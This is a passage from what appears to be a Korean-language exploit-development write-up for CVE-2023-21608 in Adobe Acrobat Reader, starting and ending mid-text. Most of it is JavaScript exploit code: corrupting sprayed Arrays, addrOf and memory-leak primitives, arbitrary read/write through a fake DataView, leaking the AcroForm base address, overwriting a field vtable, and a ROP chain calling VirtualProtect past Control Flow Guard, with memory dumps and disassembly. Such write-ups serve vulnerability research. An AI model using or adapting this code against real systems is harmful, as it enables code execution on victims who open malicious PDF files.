&#xBC1C;&#xC0DD;&#xD558;&#xB294; <code>corruptedTypedArr</code>&#xB97C; &#xCC3E;&#xC544;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xD1B5;&#xD574; <code>sprayArrBuffers</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB41C; &#xC778;&#xC811;&#xD55C; <code>Array</code>&#xB4E4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB41C; <code>Array</code>&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC640; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</p><pre><code class="hljs apache"><span class="hljs-attribute">24188270</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000</span>f<span class="hljs-number">80</span> <span class="hljs-number">00000</span>f<span class="hljs-number">80</span> <span class="hljs-number">00000</span>f<span class="hljs-number">80</span>  ................<span class="hljs-attribute">24188280</span>  <span class="hljs-number">47484950</span> ffffff<span class="hljs-number">81</span> <span class="hljs-number">0</span>db<span class="hljs-number">3</span>c<span class="hljs-number">420</span> ffffff<span class="hljs-number">85</span>  PIHG.... .......<span class="hljs-attribute">24188290</span>  <span class="hljs-number">0</span>dda<span class="hljs-number">27</span>c<span class="hljs-number">0</span> ffffff<span class="hljs-number">87</span> <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span>  .&apos;......QPQP....<span class="hljs-attribute">241882a0</span>  <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span> <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span>  QPQP....QPQP....<span class="hljs-attribute">241882b0</span>  <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span> <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span>  QPQP....QPQP....<span class="hljs-attribute">241882c0</span>  <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span> <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span>  QPQP....QPQP....<span class="hljs-attribute">241882d0</span>  <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span> <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span>  QPQP....QPQP....<span class="hljs-attribute">241882e0</span>  <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span> <span class="hljs-number">50515051</span> ffffff<span class="hljs-number">81</span>  QPQP....QPQP....</code></pre><p><code>Array</code>&#xC5D0;&#xB294; &#xB370;&#xC774;&#xD130; &#xAC12;&#xB9CC; &#xC800;&#xC7A5;&#xB418;&#xB294; <code>ArrayBuffer</code>&#xC640; &#xB2EC;&#xB9AC; &#xAC01; 4&#xBC14;&#xC774;&#xD2B8;&#xC758; &#xB370;&#xC774;&#xD130; &#xAC12;&#xACFC; &#xD0C0;&#xC785;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xD0DC;&#xADF8; &#xAC12;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; jsval&#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798;&#xB294;  Adobe Acrobat Reader&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; Javascript &#xC5D4;&#xC9C4;&#xC778; SpiderMonkey&#xC5D0;&#xC11C; jsval&#xC744; &#xD45C;&#xD604;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xB098;&#xD0C0;&#xB0B8; &#xADF8;&#xB9BC;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%206.png" alt="Untitled"></p><blockquote><p>&#xADF8;&#xB9BC;.1: <a href="https://downloads.immunityinc.com/infiltrate-archives/the_shadow_over_firefox_infiltrate_2015.pdf">&#xCD9C;&#xCC98;</a> Slide 10</p></blockquote><p>&#xC774;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xC5EC; <code>Array</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xBA74; <code>0db3c420 ffffff85</code>&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC778; <code>targetStr</code>&#xC774;&#xACE0; <code>0dda27c0 ffffff87</code>&#xB294; DataView&#xC778; <code>targetDV</code>&#xC778; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Corrupt-Sparyed-Array"><a href="#Corrupt-Sparyed-Array" class="headerlink" title="Corrupt Sparyed Array"></a>Corrupt Sparyed Array</h3><p>&#xBA3C;&#xC800; &#xBCC0;&#xC870;&#xB41C; <code>ArrayBuffer</code>&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC811;&#xD55C; <code>Array</code>&#xB97C; &#xCC3E;&#xAE30; &#xC704;&#xD574; OOB Read&#xB97C; &#xD65C;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>OOB Read&#xB85C; &#xC77D;&#xC740; &#xB370;&#xC774;&#xD130;&#xB97C; <code>Array[0]</code>&#xC5D0; &#xC704;&#xCE58;&#xD55C; 0x47484950&#xACFC; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD1B5;&#xD574; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB41C; <code>Array</code>&#xC784;&#xC744; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xACE0; OOB Read&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C; &#xC778;&#xB371;&#xC2A4;&#xC5D0;&#xC11C; 4&#xB97C; &#xBE7C;&#xC11C; <code>Array</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC778;&#xB371;&#xC2A4; <code>arrStart</code>&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; &#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; <code>Array</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC5EC; <code>targetStr</code>&#xACFC; <code>targetDV</code>&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xAC01;&#xAC01; <code>FAKE_STR</code>&#xACFC; <code>FAKE_DV</code>&#xB85C; &#xBCC0;&#xC870;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">originalTargetStrAddr = uintArr[arrStart + <span class="hljs-number">6</span>];<span class="hljs-comment">// corrupted ArrayBuffer</span>originalTargetDVAddr = uintArr[arrStart + <span class="hljs-number">8</span>];<span class="hljs-comment">// corrupt for further primitives</span>uintArr[arrStart + <span class="hljs-number">4</span>] = <span class="hljs-number">0x47484951</span>;uintArr[arrStart + <span class="hljs-number">6</span>] = FAKE_STR; <span class="hljs-comment">// 0x20000058 + 0x100</span>uintArr[arrStart + <span class="hljs-number">8</span>] = FAKE_DV; <span class="hljs-comment">//0x20000058 + 0x180</span>corruptedTypedArr = uintArr;</code></pre><p><code>FAKE_STR</code>&#xACFC; <code>FAKE_DV</code>&#xB294; &#xBCC0;&#xC870;&#xB41C; <code>ArrayBuffer</code>&#xC758; &#xB370;&#xC774;&#xD130; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xC778; 0x20000058&#xB85C;&#xBD80;&#xD130; &#xAC01;&#xAC01; 0x100, 0x180 &#xB9CC;&#xD07C; &#xB5A8;&#xC5B4;&#xC9C4; &#xC704;&#xCE58;&#xC5D0; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="3-AddrOf-amp-poi-Primitives"><a href="#3-AddrOf-amp-poi-Primitives" class="headerlink" title="3. AddrOf &amp; poi Primitives"></a>3. AddrOf &amp; poi Primitives</h2><h3 id="AddrOf-Primitive"><a href="#AddrOf-Primitive" class="headerlink" title="AddrOf Primitive"></a>AddrOf Primitive</h3><p>&#xC784;&#xC758;&#xC758; Javascript &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xCD9C;&#xD558;&#xAE30; &#xC704;&#xD55C; addrof&#xB97C; &#xBCC0;&#xC870;&#xB41C; <code>ArrayBuffer</code>(<code>corruptedTypedArr</code>)&#xC640; <code>Array</code>(<code>modifiedArr</code>)&#xB97C; &#xD1B5;&#xD574; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs jsx"><span class="hljs-keyword">var</span> modifiedArr = <span class="hljs-literal">null</span>;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arrs.length; i++) {    <span class="hljs-keyword">if</span> (arrs[i][<span class="hljs-number">0</span>] == <span class="hljs-number">0x47484951</span>) {        modifiedArr = arrs[i];        <span class="hljs-keyword">break</span>;    }}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params">obj</span>) </span>{    modifiedArr[<span class="hljs-number">0</span>] = obj;    addr = corruptedTypedArr[arrStart + <span class="hljs-number">4</span>];    <span class="hljs-keyword">return</span> addr;}</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB41C; <code>Array</code>&#xB4E4;&#xC744; &#xC21C;&#xD68C;&#xD558;&#xBA70; <code>Array[0]</code>&#xC774; &#xC6D0;&#xBCF8;&#xC778;  0x47484950&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xBCC0;&#xC870;&#xB41C; 0x47484951&#xC778; <code>Array</code>&#xB97C; &#xCC3E;&#xC544;&#xB0B4;&#xACE0; &#xC774;&#xB97C; <code>modifiedArr</code>&#xC5D0; &#xB300;&#xC785;&#xD569;&#xB2C8;&#xB2E4;. <code>corruptedTypedArr[arrStart + 4]</code>&#xB85C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC73C;&#xBA74; <code>modifiedArr[0]</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; jsval&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC77D;&#xD788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><code>addrOf</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; <code>modifiedArr[0]</code>&#xC5D0; &#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xB300;&#xC785;&#xD558;&#xACE0; <code>corruptedTypedArr[arrStart + 4]</code>&#xB85C; &#xC5EC;&#xAE30;&#xC5D0; &#xC4F0;&#xC778; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC77D;&#xC5B4; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="poi-Primitive"><a href="#poi-Primitive" class="headerlink" title="poi Primitive"></a>poi Primitive</h3><p><code>modifiedArr[1]</code>&#xC740; &#xC6D0;&#xBCF8; String &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xAC00; &#xC544;&#xB2CC; <code>corruptedTypedArr</code>&#xC5D0; &#xAD6C;&#xC131;&#xB41C; Fake String&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xC784;&#xC758;&#xC758; &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xC77D;&#xC5B4;&#xC624;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;</p><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> FAKE_STR_START = <span class="hljs-number">0x40</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">s2h</span>(<span class="hljs-params">s</span>) </span>{    <span class="hljs-keyword">var</span> n1 = s.charCodeAt(<span class="hljs-number">0</span>);    <span class="hljs-keyword">var</span> n2 = s.charCodeAt(<span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> ((n2 &lt;&lt; <span class="hljs-number">16</span>) | n1) &gt;&gt;&gt; <span class="hljs-number">0</span>;}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">poi</span>(<span class="hljs-params">addr</span>) </span>{    <span class="hljs-comment">// leak values at addr by setting it to string ptr</span>    corruptedTypedArr[FAKE_STR_START + <span class="hljs-number">1</span>] = addr;    val = s2h(modifiedArr[<span class="hljs-number">1</span>]);    <span class="hljs-keyword">return</span> val;}</code></pre><p><code>poi</code>&#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>corruptedTypedArr</code>&#xC5D0; &#xAD6C;&#xC131;&#xB41C; Fake String&#xC758; &#xBB38;&#xC790;&#xC5F4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC744; &#xC8FC;&#xC18C;&#xB85C; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>modifiedArr[1]</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74; Fake String&#xC774; &#xBC18;&#xD658;&#xB418;&#xACE0; &#xBCC0;&#xC870;&#xB41C; &#xC8FC;&#xC18C;&#xC5D0; &#xC704;&#xCE58;&#xD55C; &#xBB38;&#xC790;&#xC5F4;&#xC744; <code>s2h</code>&#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC22B;&#xC790;&#xB85C; &#xBCC0;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="4-Arbitrary-Address-Read-Write-Primitive"><a href="#4-Arbitrary-Address-Read-Write-Primitive" class="headerlink" title="4. Arbitrary Address Read/Write Primitive"></a>4. Arbitrary Address Read/Write Primitive</h2><p>&#xC704;&#xC5D0;&#xC11C; &#xAD6C;&#xD604;&#xB41C; <code>addrOf</code>, <code>poi</code>&#xB85C; Fake <code>DataView</code>&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xB97C; &#xC704;&#xD55C; <code>AAR</code>, <code>AAW</code> &#xD568;&#xC218;&#xB97C; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-keyword">var</span> targetDV = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x64</span>));targetDV.setUint32(<span class="hljs-number">0</span>, <span class="hljs-number">0x55555555</span>, <span class="hljs-literal">true</span>);<span class="hljs-keyword">const</span> FAKE_DV_START = <span class="hljs-number">0x60</span>;<span class="hljs-comment">//....</span><span class="hljs-keyword">var</span> targetDVPtr = addrOf(targetDV);<span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[+] target dataview address: &quot;</span> + targetDVPtr.toString(<span class="hljs-number">16</span>));<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">32</span>; k++) {    corruptedTypedArr[FAKE_DV_START + k] = poi(targetDVPtr + k * <span class="hljs-number">4</span>);}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">AAR</span>(<span class="hljs-params">addr</span>) </span>{    corruptedTypedArr[FAKE_DV_START + <span class="hljs-number">20</span>] = addr;    <span class="hljs-keyword">return</span> modifiedArr[<span class="hljs-number">2</span>].getUint32(<span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">AAW</span>(<span class="hljs-params">addr, value</span>) </span>{    corruptedTypedArr[FAKE_DV_START + <span class="hljs-number">20</span>] = addr;    modifiedArr[<span class="hljs-number">2</span>].setUint32(<span class="hljs-number">0</span>, value, <span class="hljs-literal">true</span>);}</code></pre><p>Fake <code>DataView</code>&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBA3C;&#xC800; <code>addrOf</code>&#xB85C; &#xC6D0;&#xBCF8; <code>DataView</code>&#xC778; <code>targetDV</code>&#xC758; &#xC8FC;&#xC18C;(<code>targetDVptr</code>)&#xC744; &#xC54C;&#xC544;&#xB0C5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xC6D0;&#xBCF8;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; <code>poi</code>&#xB85C; &#xC77D;&#xC5B4; <code>corruptedTypedArr[FAKE_DV_START]</code>&#xC5D0; &#xBCF5;&#xC81C;&#xD558;&#xC5EC; Fake <code>DataView</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xC758;&#xB3C4;&#xCE58; &#xC54A;&#xC740; &#xB3D9;&#xC791;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><code>AAR</code>, <code>AAW</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>corruptedTypedArr[FAKE_DV_START + 20]</code>&#xC5D0; &#xC704;&#xCE58;&#xD55C; <code>DataView</code>&#xC758; <code>ArrayBuffer</code> &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC77D;&#xAC70;&#xB098; &#xC4F8; &#xC8FC;&#xC18C;&#xB85C; &#xBCC0;&#xC870;&#xD569;&#xB2C8;&#xB2E4;. &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>modifiedArr[2]</code>&#xB85C; Fake <code>DataView</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC5EC; <code>setUint32</code>&#xB098; <code>getUint32</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC784;&#xC758;&#xC758; &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; 4&#xBC14;&#xC774;&#xD2B8;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xAC70;&#xB098; &#xC4F0;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h2 id="5-Insert-ROP-Payload"><a href="#5-Insert-ROP-Payload" class="headerlink" title="5. Insert ROP Payload"></a>5. Insert ROP Payload</h2><p><code>addrOf</code>, <code>AAR</code>, <code>AAW</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBCA0;&#xC774;&#xC2A4; &#xC8FC;&#xC18C; &#xB4F1; &#xD544;&#xC694;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC720;&#xCD9C;&#xD558;&#xACE0; ROP &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0; vtable&#xC744; &#xBCC0;&#xC870;&#xD558;&#xC5EC; &#xC0BD;&#xC785;&#xD55C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB3C4;&#xB85D; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><h3 id="Leak-AcroForm-Base-Address"><a href="#Leak-AcroForm-Base-Address" class="headerlink" title="Leak AcroForm Base Address"></a>Leak AcroForm Base Address</h3><p>&#xBA3C;&#xC800; ROP &#xAC00;&#xC82F;&#xB4E4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xAE30; &#xC704;&#xD574; <code>AAR</code>&#xD568;&#xC218;&#xB85C; <code>textField</code>&#xC778; <code>f0</code>&#xB85C;&#xBD80;&#xD130; <code>AcroForm.API</code>&#xC758; &#xBCA0;&#xC774;&#xC2A4; &#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xBCC0;&#xC870;&#xD560; <code>field</code>&#xC758; vtable&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xACE0; Fake <code>DataView</code>&#xB97C; &#xAD6C;&#xC131;&#xD560; &#xB54C;&#xC640; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; vtable&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC5B4; <code>corruptedTypedArr</code>&#xC774; &#xC704;&#xCE58;&#xD55C; 0x20000158(<code>arrBufPtr + 0x100</code>)&#xC5D0; &#xBCF5;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> arrBufPtr = <span class="hljs-number">0x20000048</span> + <span class="hljs-number">0x10</span>;<span class="hljs-keyword">var</span> AcroFormApiBase =    AAR(AAR(addrOf(f0) + <span class="hljs-number">0x10</span>) + <span class="hljs-number">0x34</span>) - VersionData[curAppVersion][<span class="hljs-string">&quot;AcroFormOffset&quot;</span>];<span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[+] AcroForm base leaked: &quot;</span> + AcroFormApiBase.toString(<span class="hljs-number">16</span>));<span class="hljs-keyword">var</span> fieldVtblAddr = AAR(AAR(AAR(AAR(addrOf(f0) + <span class="hljs-number">0x10</span>) + <span class="hljs-number">0x10</span>) + <span class="hljs-number">0xc</span>) + <span class="hljs-number">4</span>);<span class="hljs-keyword">var</span> fieldVtbl = AAR(fieldVtblAddr);<span class="hljs-built_in">console</span>.println(    <span class="hljs-string">&quot;[+] field vTable Addr: &quot;</span> +        fieldVtblAddr.toString(<span class="hljs-number">16</span>) +        <span class="hljs-string">&quot; | fieldVtable: &quot;</span> +        fieldVtbl.toString(<span class="hljs-number">16</span>));<span class="hljs-string">``</span><span class="hljs-string">``</span><span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[*] clone field vtable for overwriting defaultValue pointer&quot;</span>);<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) AAW(arrBufPtr + <span class="hljs-number">0x100</span> + i * <span class="hljs-number">4</span>, AAR(fieldVtbl + i * <span class="hljs-number">4</span>));<span class="hljs-keyword">var</span> originalDefaulValFunc = AAR(arrBufPtr + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x48</span>);</code></pre><h3 id="Building-ROP-Chain-CFG-Bypass"><a href="#Building-ROP-Chain-CFG-Bypass" class="headerlink" title="Building ROP Chain : CFG Bypass"></a>Building ROP Chain : CFG Bypass</h3><pre><code class="hljs jsx">ROP = VersionData[curAppVersion][<span class="hljs-string">&quot;ROP&quot;</span>];AAW(arrBufPtr + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x48</span>, AcroFormApiBase + ROP[<span class="hljs-number">0</span>]); <span class="hljs-comment">// ROP_s = AcroForm!sub_20EFAA60 ;</span>AAW(arrBufPtr + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x30</span>, AcroFormApiBase + ROP[<span class="hljs-number">1</span>]); <span class="hljs-comment">// xchg eax, esp ; ret ;</span>AAW(arrBufPtr + <span class="hljs-number">0x100</span>, AcroFormApiBase + ROP[<span class="hljs-number">2</span>]); <span class="hljs-comment">// pop esp ; ret ;</span>AAW(arrBufPtr + <span class="hljs-number">0x100</span> + <span class="hljs-number">4</span>, arrBufPtr + <span class="hljs-number">0x300</span>); <span class="hljs-comment">// pivot to our _stack</span>AAW(fieldVtblAddr, arrBufPtr + <span class="hljs-number">0x100</span>); <span class="hljs-comment">// overwrite field vtable to our ROP start</span><span class="hljs-built_in">console</span>.println(<span class="hljs-string">&quot;[*] storing recovery context!&quot;</span>);AAW(arrBufPtr + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x60</span>, fieldVtblAddr); <span class="hljs-comment">// original vtable ptr (goes back in ecx)</span>AAW(arrBufPtr + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x64</span>, fieldVtbl); <span class="hljs-comment">// vtable funcs ptr</span>AAW(arrBufPtr + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x68</span>, originalDefaulValFunc); <span class="hljs-comment">// original defaultVal impl to jump to</span>AAW(arrBufPtr + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x6c</span>, AAR(ARR_BUF_BASE + <span class="hljs-number">8</span>)); <span class="hljs-comment">// corrupted arrbuf typed array ptr</span>AAW(arrBufPtr + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x70</span>, AAR(ARR_BUF_MALLOC_BASE)); <span class="hljs-comment">// malloc header 0</span>AAW(arrBufPtr + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x74</span>, AAR(ARR_BUF_MALLOC_BASE + <span class="hljs-number">4</span>)); <span class="hljs-comment">// malloc header 1</span><span class="hljs-keyword">var</span> rop = [    AAR(AcroFormApiBase + VersionData[curAppVersion][<span class="hljs-string">&quot;VirtualProtect&quot;</span>]), <span class="hljs-comment">// VirtualProtect</span>    arrBufPtr + <span class="hljs-number">0x400</span>, <span class="hljs-comment">// return address</span>    arrBufPtr + <span class="hljs-number">0x400</span>, <span class="hljs-comment">// buffer</span>    <span class="hljs-number">0x1000</span>, <span class="hljs-comment">// sz</span>    <span class="hljs-number">0x40</span>, <span class="hljs-comment">// new protect</span>    arrBufPtr + <span class="hljs-number">0x540</span> <span class="hljs-comment">// old protect</span>];<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; rop.length; i++) AAW(arrBufPtr + <span class="hljs-number">0x300</span> + <span class="hljs-number">4</span> * i, rop[i]);</code></pre><p>&#xC774;&#xD6C4; &#xBCF5;&#xC81C;&#xB41C; vtable&#xC5D0; ROP &#xAC00;&#xC82F; &#xC8FC;&#xC18C;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xACE0; <code>textField</code>&#xC778; <code>f0</code>&#xC758; vtable &#xC8FC;&#xC18C;&#xB97C; Fake vtable&#xB85C; &#xC870;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>f0.defaultValue</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74; <code>vtable + 0x48</code>&#xC5D0; &#xC704;&#xCE58;&#xD55C; <code>defaultValue</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB294;&#xB370; Fake vtable&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC758; <code>sub_20EFAA60</code>&#xC5D0; &#xD574;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs nasm">.text:20EFAA60 sub_20EFAA60    proc near               .text:20EFAA60                                         .text:20EFAA60                 mov     eax, [ecx].text:20EFAA62                 push    0Dh.text:20EFAA64                 call    dword ptr [eax+30h].text:20EFAA67                 retn.text:20EFAA67 sub_20EFAA60    endp</code></pre><p>Adobe Acrobat Reader DC&#xB294; CFG(Control Flow Guard)&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC5B4; vtable&#xC744; &#xD1B5;&#xD55C; &#xAC00;&#xC0C1; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC774;&#xB098; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xD1B5;&#xD55C; &#xD638;&#xCD9C; &#xB4F1;&#xC758; &#xAC04;&#xC811; &#xD638;&#xCD9C;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xB54C; <code>__guard_check_icall_fptr</code>&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; <code>ntdll!LdrpValidateUserCallTarget</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xC5B4; &#xC720;&#xD6A8;&#xD55C; &#xAC04;&#xC811; &#xD638;&#xCD9C;&#xC778;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xADF8;&#xB807;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xAC15;&#xC81C; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; vtable&#xC5D0; &#xC9C1;&#xC811; ROP &#xAC00;&#xC82F;&#xC744; &#xC0BD;&#xC785;&#xD558;&#xBA74; 